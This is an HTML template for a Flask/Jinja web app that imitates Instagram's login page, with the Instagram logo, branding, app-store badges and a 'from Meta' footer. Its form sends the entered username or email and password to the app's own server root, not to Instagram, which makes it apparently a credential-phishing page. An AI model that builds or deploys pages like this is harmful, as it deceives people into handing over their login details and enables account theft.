{% extends 'base.html' %}

{% block body %}
<span id="root">
    <section class="section-all">
        <!-- Main Section -->
        <main class="main" role="main">
            <div class="wrapper">
                <article class="article">
                    <div class="content">
                        <!-- Logo -->
                        <div class="login-box">
                            <div class="header">
                                <img class="logo" src="/static/Screenshot_from_2024-11-13_14-54-33-removebg-preview.png" style="position: relative; left:45px; color:white" alt="Instagram">
                            </div>

                            <!-- Login Form -->
                            <div class="form-wrap">
                                <form class="form" action="/" method="POST">
                                    <div class="input-box">
                                        <input type="text" name="name" id="name" placeholder="Phone number, username, or email" maxlength="30" required>
                                    </div>
                                    <div class="input-box">
                                        <input type="password" name="paswd" id="password" placeholder="Password" maxlength="30" required>
                                    </div>
                                    <div class="button-box">
                                        <button class="btn" type="submit">Log in</button>
                                    </div>
                                    <a class="forgot" href="#">Forgot password?</a>
                                </form>
                            </div>
                        </div>

                        <!-- Signup Box -->
                        <div class="login-box">
                            <p class="text">Don't have an account? <a href="#">Sign up</a></p>
                        </div>

                        <!-- App Links -->
                        <div class="app">
                            <p>Get the app.</p>
                            <div class="app-img">
                                <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                                    <img src="https://logos-world.net/wp-content/uploads/2021/02/App-Store-Symbol-700x394.png" style="position: relative; top:18px " alt="App Store" class="app-badge">
                                </a>
                                <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
                                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/2560px-Google_Play_Store_badge_EN.svg.png" alt="Google Play" class="app-badge">
                                </a>
                            </div>
                        </div>
                    </div>
                </article>
            </div>
        </main>

        <!-- Footer -->
        <footer class="footer" role="contentinfo">
            <div class="footer-container">
                <nav class="footer-nav" role="navigation">
                    <ul>
                        <li><a href="#">About</a></li>
                        <li><a href="#">Blog</a></li>
                        <li><a href="#">Jobs</a></li>
                        <li><a href="#">Help</a></li>
                        <li><a href="#">API</a></li>
                        <li><a href="#">Privacy</a></li>
                        <li><a href="#">Terms</a></li>
                        <li><a href="#">Locations</a></li>
                        <li>
                            <span class="language">
                                <div name="language" class="select">
                                    <li href="#English">English ^</li>
                                </div>
                            </span>
                        </li>
                    </ul>
                </nav>
                <span class="footer-logo">&copy; 2024 Instagram from Meta</span>
            </div>
        </footer>
    </section>
</span>
{% endblock %}
